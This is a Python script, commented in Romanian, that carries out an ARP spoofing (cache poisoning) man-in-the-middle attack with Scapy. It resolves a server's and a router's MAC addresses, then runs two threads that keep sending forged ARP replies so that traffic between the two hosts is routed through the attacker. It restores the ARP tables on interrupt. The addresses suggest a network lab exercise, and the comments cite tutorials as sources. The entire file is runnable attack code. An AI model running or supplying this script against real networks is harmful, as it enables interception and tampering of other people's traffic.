#https://www.geeksforgeeks.org/how-to-make-a-arp-spoofing-attack-using-scapy-python/
#https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

#import tot scapy-ul
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import scapy.all as scapy
import threading

time_out = 2


def get_macadrees(_ip):
    '''
    Returneaza mac adress ul pentru un ip 
    :param _ip: string de numere delimitate cu punct
    :return: string mac adress delimitate prin doua puncte 
    '''
    #fac requestul de ARP dupa adresa ip din parametrii
    #pdst = ip ul destinatie
    request = scapy.ARP(pdst=_ip) 

    #fac brodcastul pentru toate
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    #combin layere
    final_packet = broadcast / request
    
    # answer = result-urile dupa ce fac broadcast
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]

    #hwsrc = mac adressu -ul sursei care a trimit reply packet-ul, adica al targetului
    try: 
        mac_adress = answer[0][1].hwsrc
    except:
        print("Nu a fost gasit ip-ul: " + _ip)
        sys.exit(1)
        return 
    return mac_adress



def spoof_router():
    while True:
        # cream un pachet ARP 

        packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=server_ip)
       
        # Trimit la router pachetul care il face sa creada ca middle este serverul 
        scapy.send(packet, verbose=False)

        print(f"[INFO] Sent spoofed ARP packet: {server_ip} is-at {router_mac} to {router_ip}")
        
        time.sleep(time_out) 
        

def spoof_server():
    while True:
         # cream un pachet ARP 
        packet = scapy.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=router_ip)
        # Trimit la server pachetul care il face sa creada ca middle este router-ul 
        scapy.send(packet, verbose=False)

        print(f"[INFO] Sent spoofed ARP packet: {router_ip} is-at {server_mac} to {server_ip}")
        
        time.sleep(time_out) 
       



def restore_server():
    print("Restoring router's MAC address for the server")
    for i in range(5):
        packet = scapy.ARP(op=2, pdst=server_ip, hwsrc=router_mac, psrc=router_ip)
        scapy.send(packet, verbose = False)

def restore_router():
    print("Restoring server's MAC address for the router")
    for i in range(5):
        packet = scapy.ARP(op=2, pdst=router_ip, hwsrc=server_mac, psrc=server_ip)
        scapy.send(packet, verbose = False)


#Parametrii de ARP spoofing
    # ip-urile sunt de pe subnet2  
server_ip = "198.7.0.2"
router_ip = "198.7.0.1" 

#Extrag MAC adress-urile pentru server si router
server_mac = get_macadrees(server_ip)
router_mac = get_macadrees(router_ip)

#main
def startSpoofing():
    

    #testez daca a functionat preluarea de adrese MAC
    if server_mac is None:
        print("[ERROR] Eroare la preluarea MAC-ului pentru ip-ul: " + server_ip)
        sys.exit(1)
    if router_mac is None:
        print("[ERROR] Eroare la preluarea MAC-ului pentru ip-ul: " + router_ip)
        sys.exit(1)

    print(server_ip + " " + server_mac)
    print(router_ip + " " + router_mac)

    #pornesc aplicatia pe thread-uri
    try:
        print("[INFO] Starting the attack")
        thread_router = threading.Thread(target = spoof_router)
        thread_server = threading.Thread(target = spoof_server)

        thread_router.start()
        thread_server.start()

        thread_router.join()
        thread_server.join()


    except KeyboardInterrupt:
        print("[INFO] Restoring ARP tables ...")
        restore_router()
        restore_server()
        sys.exit(1)

if __name__ == '__main__':
    startSpoofing()